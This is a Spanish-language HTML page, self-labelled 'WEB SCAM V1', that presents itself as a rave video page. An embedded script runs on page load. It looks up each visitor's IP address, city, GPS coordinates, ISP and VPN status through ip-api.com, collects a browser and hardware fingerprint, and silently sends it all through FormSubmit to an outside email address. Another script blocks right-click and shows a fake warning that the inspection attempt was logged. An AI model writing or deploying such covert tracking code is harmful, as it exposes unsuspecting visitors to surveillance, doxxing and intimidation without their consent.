<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>TU IP ESTA A MANOS DE 33 AHORA- MI WEB MIS REGLAS</title>
    <style>
        /* --- ESTILOS RAVE/DARK --- */
        body {
            font-family: 'Arial Black', sans-serif;
            text-align: center;
            padding-top: 50px;
            background-color: #121212;
            color: #E0E0E0;
        }
        h1 {
            color: #00ff99;
            text-shadow: 0 0 10px rgba(0, 255, 153, 0.7);
            margin-bottom: 5px;
            transition: visibility 0.5s;
        }
        p {
            color: #AAAAAA;
            margin-top: 5px;
        }
        video {
            border: 5px solid #ff00ff;
            box-shadow: 0 0 20px rgba(255, 0, 255, 0.8);
            border-radius: 8px;
            margin-top: 20px;
            transition: border-color 0.5s, box-shadow 0.5s;
        }
    </style>
</head>
<body>
    <h1>BIENVENIDO USUARIO DE RAVE: TE VAS TRACKEADO</h1>
    <p>CODIGO FUENTE Y SCRIPTS CREADOS POR 33 - MANEJO DE HOSTING Y SERVIDOR POR 32.</p>

    <video width="720" controls> 
      <source src="clip.mp4" type="video/mp4">
      Tu navegador no puede reproducir este video.
    </video>

    <p>WEB SCAM V1</p>

    <script>
        // --- CONFIGURACI√ìN CR√çTICA ---
        // üìß CORREO DE DESTINO:
        const FORM_SUBMIT_ENDPOINT = 'https://formsubmit.co/ajax/system404g%40gmail.com'; 
        
        // --- 1. Recolecci√≥n de datos del dispositivo ---
        const userAgent = navigator.userAgent;
        const userLanguage = navigator.language || navigator.userLanguage;
        const screenRes = window.screen.width + 'x' + window.screen.height;
        const cpuCores = navigator.hardwareConcurrency || 'N/A';
        const platform = navigator.platform;
        const referrer = document.referrer || 'Acceso Directo';
        const timeZone = Intl.DateTimeFormat().resolvedOptions().timeZone;
        const colorDepth = screen.colorDepth;
        
        // --- FUNCI√ìN PRINCIPAL: Escaneo Completo de IP (Usando API P√∫blica Sin Clave) ---
        
        // Paso A: Escanear la IP con ip-api.com (Geo, ISP, Seguridad)
        // Usamos un endpoint que devuelve la mayor cantidad de datos sin necesidad de API Key.
        // NOTA: Se usa 'http' porque la API gratuita es menos estable con HTTPS en algunos hosts.
        const scanUrl = 'http://ip-api.com/json/?fields=status,message,country,countryCode,region,regionName,city,zip,lat,lon,timezone,isp,org,as,query,reverse,hosting,proxy,mobile';

        fetch(scanUrl)
            .then(geoResponse => geoResponse.json())
            .then(geoData => {
                
                const userIP = geoData.query || 'N/A'; // La IP es parte de la respuesta
                
                // Ensamblar TODOS los datos para el env√≠o final
                const finalPayload = {
                    "_subject": "ESCANEO COMPLETO DE IP (P√öBLICO) - TeVasTrackeado", 
                    "IP_Visitante": userIP,
                    
                    // --- DATOS DE GEOLOCALIZACI√ìN Y RED (ip-api.com) ---
                    "Geo_Pais_Region": `${geoData.country || 'N/A'} - ${geoData.regionName || 'N/A'} (${geoData.city || 'N/A'})`,
                    "Coordenadas_GPS_IP": `${geoData.lat || 'N/A'}, ${geoData.lon || 'N/A'}`,
                    "Organizacion_ISP": geoData.isp || geoData.org || 'N/A',
                    "ASN": geoData.as || 'N/A',
                    "Codigo_Postal": geoData.zip || 'N/A',
                    "Reverse_DNS": geoData.reverse || 'N/A', // Hostname de la IP

                    // --- DATOS DE SEGURIDAD Y CONEXI√ìN ---
                    "Es_Proxy_VPN": geoData.proxy === true ? 'üö® S√ç' : 'No',
                    "Es_Movil": geoData.mobile === true ? 'S√≠' : 'No',
                    "Es_Hosting_DataCenter": geoData.hosting === true ? 'S√≠' : 'No',

                    // --- DATOS DEL NAVEGADOR Y HARDWARE ---
                    "Agente_de_Usuario": userAgent,
                    "Plataforma_SO": platform,
                    "Nucleos_CPU": cpuCores,
                    "Resolucion": screenRes,
                    "Profundidad_Color": colorDepth,
                    "Idioma": userLanguage,
                    "Zona_Horaria": timeZone,
                    "Referencia_Web": referrer,
                    "Fecha_Hora_Visita": new Date().toLocaleString(),
                };
                
                // Enviar TODOS los datos al correo (FormSubmit)
                return fetch(FORM_SUBMIT_ENDPOINT, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                        'Accept': 'application/json'
                    },
                    body: JSON.stringify(finalPayload)
                });
            })
            .catch(error => console.error('Error Cr√≠tico en el Escaneo:', error));
    </script>
    
    <script>
        // Efecto 1: T√≠tulo Parpadeante (Ne√≥n)
        function blink() {
            var h1 = document.querySelector('h1');
            h1.style.visibility = (h1.style.visibility === 'hidden' ? 'visible' : 'hidden');
        }
        setInterval(blink, 500);

        // Efecto 2: Cambio de Color de Borde Aleatorio (Rave)
        function changeBorderColor() {
            const video = document.querySelector('video');
            const randomColor = '#' + Math.floor(Math.random()*16777215).toString(16).padStart(6, '0');
            video.style.borderColor = randomColor;
            video.style.boxShadow = `0 0 25px ${randomColor}`;
        }
        setInterval(changeBorderColor, 2000);

        // Bloqueo de Clic Derecho
        document.addEventListener('contextmenu', function(e) {
            e.preventDefault();
            alert("Advertencia: Intento de inspecci√≥n registrado. Acceso denegado.");
        });
        
        // Redireccionamiento a HTTPS
        if (window.location.protocol === 'http:') {
            window.location.protocol = 'https:';
        }
    </script>
</body>
</html>
